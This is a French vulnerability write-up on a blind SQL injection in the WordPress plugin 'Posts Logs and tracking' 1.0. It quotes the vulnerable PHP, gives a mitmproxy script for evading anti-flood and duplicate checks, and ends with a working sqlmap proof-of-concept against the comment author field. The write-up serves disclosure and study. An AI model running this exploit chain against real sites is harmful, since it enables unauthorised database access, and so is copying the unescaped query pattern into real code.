---
title: "Injection SQL dans le plugin Wordpress Posts Logs and tracking"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Posts Logs and tracking](https://wordpress.org/plugins/posts-logs-and-tracking/) se présente de cette façon :

> The tracking plugin Logs every new post with posted time , Log every new comments and reply posted time

La version testée est la 1.0 qui date d'il y a 9 ans au moment de ces lignes.

## La vulnérabilité

Dans le script `WPtracking.php` on trouve une classe dont le constructeur enregistre plusieurs hooks :

```php
class WPTracking{                                                                                                      
    static $instance;

    function __construct()
    {
        self::$instance = $this;
        add_action('init', array($this, 'init'));
    }
    //add hooks on app init
    function init()
    {
        add_action('transition_post_status',  array($this, 'log_post'), 10, 3 );
        add_action('wp_set_comment_status ', array($this, 'log_comment'));
        add_action('wp_insert_comment', array($this, 'log_comment'), 99, 2);
    }
    --- snip ---
```

On remarque notamment l'appel à la fonction `log_comment` que voici :

```php
public function log_comment($comment_id, $comment_object) {
   if ($comment_object->comment_parent > 0) { // Reply
       $this->wplog('R', $comment_object);
   } else {                                   // new comment
       $this->wplog('C', $comment_object);
   }
}
```

On va se pencher en particulier sur le cas d'un nouveau commentaire avec le type `C`.

Les données soumises sont passées dans `$data` à la fonction `wplog` :

```php
public function wplog($type, $data)
{
    global $wpdb;
    // Save log by data
    if ($type == 'P')
    {
        --- snip ---                                                                                                     
    }
    if ($type == 'C')
    {
        if (get_option('wp_tracking_comment') == 1)
        {
            $author = $data->comment_author;
            $comment = $data->comment_content;
            $com_id = $data->comment_ID;
            $insert = "INSERT INTO `".$wpdb->prefix."tracking`( `track_type`, `comment_id`, `content`, `author`) VALUES
                ('C', '$com_id', '$comment','$author')";
            $wpdb->query($insert);
        }
    }
    if ($type == 'R')
```

Le problème de ces hooks c'est qu'ils laissent supposer que les données sont déjà échappées en vue de l'insertion en base ou l'affichage dans le navigateur alors que ce n'est pas le cas.

Ici, on peut par exemple exploiter une faille d'injection SQL via le champ `author` lorsque l'on poste un commentaire. 

Il y a toutefois deux mécanismes qui bloquent l'automatisation de la vulnérabilité (par exemple avec `sqlmap`) :

- l'anti-flood de Wordpress vous oblige à attendre 15 secondes avant de pouvoir reposter un commentaire (sinon il répond avec un code HTTP 429)
- le mécanisme anti-doublon refusera votre commentaire si vous avez déjà soumis un texte identique

`sqlmap` dispose d'une option `--randomize` qui permet de spécifier dans quel(s) paramètre(s) injecter des données aléatoires.

Si on a peur de retomber sur la même valeur aléatoire pendant l'attaque alors, on peut avoir recours à un script [mitmproxy](https://mitmproxy.org/) qui réécrira le paramètre avec une donnée qui s'incrémente :

```python
from random import choices
from string import ascii_letters, digits

from mitmproxy import http

COUNT = 0

def get_random_name():
    return "".join(choices(ascii_letters + digits, k=16))

COMMENT = get_random_name()

def request(flow: http.HTTPFlow) -> None:
    global COUNT
    global AUTHOR
    if flow.request.urlencoded_form:
        if "comment" in flow.request.urlencoded_form:
            flow.request.urlencoded_form["comment"] = f"{COMMENT}{COUNT}"
            COUNT += 1
```

On lancera `mitmproxy` avec `-s` pour spécifier le chemin du script et on donnera l'adresse du proxy à `sqlmap`.

Il faut aussi donner l'option `--delay 16` à `sqlmap` pour bypasser l'anti-flood.

Autre problématique : par défaut le commentaire peut aller dans la zone de modération.

Wordpress dispose d'un paramètre qui place par défaut le premier commentaire d'un utilisateur en attente. Une fois validé l'utilisateur pourra poster d'autres commentaires sans attendre la modération.

Pour terminer le hook est exécuté [après l'insertion du commentaire](https://developer.wordpress.org/reference/hooks/wp_insert_comment/) :

> Fires immediately after a comment is inserted into the database.

Par conséquence les injections SQL seront visibles dans les commentaires par l'administrateur et potentiellement par les visiteurs.

Comme le hook stocke les commentaires dans une table différente (`wp_tracking`) on ne peut pas obtenir le résultat de l'injection dans les commentaires affichés.

L'injection se fera par conséquent en aveugle.

`sqlmap` indique aussi un problème avec le caractère `>` qui nous oblige à utiliser un script tamper.

Avec tous ces paramètres, on obtient un PoC `sqlmap` de 3 kilomètres, mais ça fait l'affaire :

PoC :

```bash
python3 sqlmap.py  -u http://localhost:8000/wp-comments-post.php \
  --data "author=yolo&email=none%40whatever.com&url=https%3A%2F%2Fperdu.com%2F&wp-comment-cookies-consent=yes&submit=Post%20Comment&comment_post_ID=1&comment_parent=0&comment=Hello%20there%21" \
  --technique TU \
  --risk 3 --level 5 \
  -p author \
  --union-cols 4 \
  --delay 16 \
  --proxy http://127.0.0.1:8080/ \
  --tamper=between \
  --current-db 
```
